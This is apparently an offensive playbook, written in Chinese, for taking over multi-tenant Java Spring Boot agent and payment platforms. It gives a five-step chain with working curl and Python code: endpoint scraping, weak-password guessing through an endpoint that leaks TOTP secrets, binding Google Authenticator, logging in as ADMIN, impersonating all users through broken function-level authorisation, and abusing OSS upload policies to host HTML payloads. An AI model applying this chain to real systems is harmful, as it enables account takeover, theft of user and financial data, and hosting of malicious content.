# Java 多租户代理平台 GA 绕过与 BFLA 接管手法

> 来源案例：tskgreenwind.com / 授权站 (2026-09)
> 栈：Java Spring Boot + 多租户 Agent 架构 + Google Auth 2FA + 阿里云 OSS

## 适用场景

后端为 Java Spring Boot，具备以下特征的多租户代理/代付/资金盘平台：
- 四层用户体系：ADMIN → AGENT → MANAGER → STAFF → MEMBER
- Google Authenticator 二次验证
- 前端 Vue/React SPA + 后端 `/manage/*` + `/account/*` API 分离
- 阿里云 OSS 做文件存储

## 指纹识别

```
/account/login/manage          → 管理端登录（非会员）
/manage/member/getList          → 会员列表
/manage/user/getOptimaList      → 系统用户列表
/manage/oss/policy              → OSS 上传策略
/account/getGoogleAuthAdmin     → GA Secret 获取（关键！）
/account/bindGoogleAuthAdmin    → GA 绑定
```

前端 JS 特征：
- `getGoogleAuthAdmin`、`bindGoogleAuthAdmin` 函数名
- `login/manage` 路径
- `authCode` 字段名（非 `googleCode`）
- 密码使用 MD5 哈希后传输

## 攻击链（5 步）

### Step 1: JS 逆向提取 API 端点

```bash
curl -s https://目标/ | grep -oP 'src="[^"]*\.js"' | head -20
# 找到主 bundle 后下载分析
curl -s https://目标/assets/Login-xxx.js | strings | grep -i 'google\|auth\|login\|manage'
```

重点提取：
- `/account/getGoogleAuthAdmin` — 仅需 account+password 返回 TOTP SecretKey
- `/account/bindGoogleAuthAdmin` — 绑定 GA（仅需 account+password+code+secretKey）
- `/account/login/manage` — 管理端登录（password 字段为 MD5）
- `/manage/user/login/{userId}` — BFLA 用户冒充

### Step 2: 弱口令碰撞

常见密码（MD5 后传输）：
```
123456 → e10adc3949ba59abbe56e057f20f883e
admin123 → 0192023a7bbd73250516f069df18b500
888888 → 21218cca77804d2ba1922c33e0151105
```

验证方式：直接调 `getGoogleAuthAdmin`，成功返回 `secretKey` 即密码正确。

```bash
curl -sk https://API/account/getGoogleAuthAdmin \
  -H 'Content-Type: application/json' \
  -d '{"account":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}'
# 成功 → {"code":200,"data":{"secretKey":"P2GN2XBTQ6336HFPCFSQSOXOAWDJ3B4K",...}}
# 密码错 → {"code":500,"message":"账号或密码错误"}
# 已绑定 → 仍返回 secretKey（设计缺陷！）
```

### Step 3: 绑定 Google Auth

```python
import pyotp, hashlib, json, urllib.request

secret = "从Step2获取的secretKey"
totp = pyotp.TOTP(secret)
code = totp.now()

data = json.dumps({
    "account": "admin",
    "password": hashlib.md5(b"123456").hexdigest(),
    "code": code,
    "secretKey": secret
}).encode()

req = urllib.request.Request(
    "https://API/account/bindGoogleAuthAdmin",
    data, headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req)
# {"code":200,"message":"request.success"}
```

### Step 4: 登录 ADMIN

```python
code2 = totp.now()
login_data = json.dumps({
    "account": "admin",
    "password": hashlib.md5(b"123456").hexdigest(),
    "authCode": code2
}).encode()

req = urllib.request.Request(
    "https://API/account/login/manage",
    login_data, headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req)
# {"code":200,"data":{"token":"xxx","role":"ADMIN","name":"admin"}}
```

### Step 5: BFLA 冒充全部用户

```bash
# 先列所有用户
curl -sk 'https://API/manage/user/getOptimaList?pageNum=1&pageSize=100' \
  -H "Authorization: ADMIN_TOKEN"

# 冒充任意用户
curl -sk -X POST 'https://API/manage/user/login/{userId}' \
  -H "Authorization: ADMIN_TOKEN" \
  -H 'Content-Type: application/json' -d '{}'
# → 返回目标用户的 token
```

## OSS 利用

```bash
# 获取上传策略
curl -sk 'https://API/manage/oss/policy?type=IMAGE' \
  -H "Authorization: TOKEN"
# → {"accessid":"LTAI5t...","host":"https://file-xxx.com","policy":"...","signature":"..."}

# 利用策略上传任意文件
curl -sk -X POST "https://file-xxx.com" \
  -F "key=xss_test.html" \
  -F "policy=..." \
  -F "OSSAccessKeyId=LTAI5t..." \
  -F "signature=..." \
  -F "file=@payload.html;type=text/html"
# → 公开访问 https://file-xxx.com/xss_test.html
```

## 注意事项

1. **GA 时钟同步**：TOTP 对时间敏感，确保本机时间准确（±30s）
2. **Agent 间隔离**：Agent 只能 BFLA 到自己的 STAFF/MANAGER，跨 Agent 需要 ADMIN 权限
3. **modifyGoogleAuth 限制**：只能重置 STAFF/MANAGER 的 GA，不能重置 ADMIN/AGENT
4. **CDN 阻断 Actuator**：如果目标用阿里云 ESA/DCDN，Actuator 端点不可达，需找源站 IP
5. **多租户数据**：切换不同 Agent token 拉各自的会员数据，通过 `staffName` 字段标注归属
